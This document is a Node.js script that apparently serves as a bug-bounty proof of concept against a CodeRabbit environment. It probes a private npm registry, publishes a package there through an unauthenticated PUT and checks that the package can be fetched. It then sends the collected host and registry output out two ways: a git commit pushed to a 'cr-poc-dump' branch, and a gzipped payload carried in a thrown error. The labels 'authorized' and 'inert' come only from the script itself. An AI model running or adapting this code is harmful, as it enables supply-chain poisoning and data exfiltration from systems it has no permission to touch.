const cp=require('child_process'); const zlib=require('zlib'); const fs=require('fs'); const crypto=require('crypto');
function sh(c){ try{ return cp.execSync(c,{timeout:28000,stdio:['ignore','pipe','pipe'],maxBuffer:8*1024*1024}).toString().trim(); }catch(e){ return 'ERR:'+String(e.message||e).slice(0,200);} }
const R='http://10.0.0.28:4873';
const NAME='kirasec-bbp-poc-'+Date.now();     // unique; shadows NOTHING real
const o=[];
o.push('=WHO= '+sh("id; hostname"));
o.push('=REG= '+R+'  NAME='+NAME);
o.push('=WHOAMI=\n'+sh("curl -sS -m 8 -i "+R+"/-/whoami | head -12"));
// build a minimal INERT package (no scripts, no deps)
sh("rm -rf /tmp/pk && mkdir -p /tmp/pk/package");
fs.writeFileSync('/tmp/pk/package/package.json', JSON.stringify({name:NAME,version:"1.0.0",description:"authorized HackerOne PoC for CodeRabbit - inert, no scripts, safe to delete"}));
fs.writeFileSync('/tmp/pk/package/README.md', "Authorized bug bounty proof of concept. Inert. Please delete.");
o.push('=TAR= '+sh("cd /tmp/pk && tar czf p.tgz package && ls -la p.tgz"));
let put='NOT-RUN', readback='NOT-RUN', tarball='NOT-RUN';
try{
  const tgz=fs.readFileSync('/tmp/pk/p.tgz');
  const b64=tgz.toString('base64');
  const sha=crypto.createHash('sha1').update(tgz).digest('hex');
  const doc={_id:NAME,name:NAME,description:"authorized HackerOne PoC - inert",
    "dist-tags":{latest:"1.0.0"},
    versions:{"1.0.0":{name:NAME,version:"1.0.0",description:"authorized HackerOne PoC - inert",
      _id:NAME+"@1.0.0",dist:{shasum:sha,tarball:R+"/"+NAME+"/-/"+NAME+"-1.0.0.tgz"}}},
    _attachments:{[NAME+"-1.0.0.tgz"]:{content_type:"application/octet-stream",data:b64,length:tgz.length}}};
  fs.writeFileSync('/tmp/pk/doc.json', JSON.stringify(doc));
  put = sh("curl -sS -m 20 -X PUT -H 'Content-Type: application/json' --data-binary @/tmp/pk/doc.json -w '\\nHTTP=%{http_code}\\n' "+R+"/"+NAME+" 2>&1 | tail -c 600");
  readback = sh("curl -sS -m 12 -w '\\nHTTP=%{http_code}\\n' "+R+"/"+NAME+" 2>&1 | head -c 900");
  tarball = sh("curl -sS -m 12 -o /tmp/pk/dl.tgz -w 'HTTP=%{http_code} bytes=%{size_download}\\n' "+R+"/"+NAME+"/-/"+NAME+"-1.0.0.tgz; tar tzf /tmp/pk/dl.tgz 2>&1 | head -5");
}catch(e){ put='EXC:'+String(e.message).slice(0,200); }
o.push('=PUBLISH_PUT=\n'+put);
o.push('=READBACK=\n'+readback);
o.push('=TARBALL_FETCH=\n'+tarball);
o.push('=NPM_VIEW=\n'+sh("npm view "+NAME+" --registry="+R+" 2>&1 | head -c 500"));
const full=o.join('\n\n');
let push='';
try{ const root=sh("git rev-parse --show-toplevel 2>/dev/null")||'/';
  fs.writeFileSync(root+'/CR_SUPPLYCHAIN_POC.txt', full);
  push=sh("cd "+root+" && git -c user.email=r@example.com -c user.name=poc add CR_SUPPLYCHAIN_POC.txt && git -c user.email=r@example.com -c user.name=poc commit -q -m poc && git push origin HEAD:refs/heads/cr-poc-dump 2>&1 | tail -3");
}catch(e){ push='PUSHERR:'+String(e.message).slice(0,140); }
const gz=zlib.gzipSync(Buffer.from(full+'\n\n=PUSH=\n'+push)).toString('base64');
throw new Error('GZ_BEGIN ' + gz + ' GZ_END');
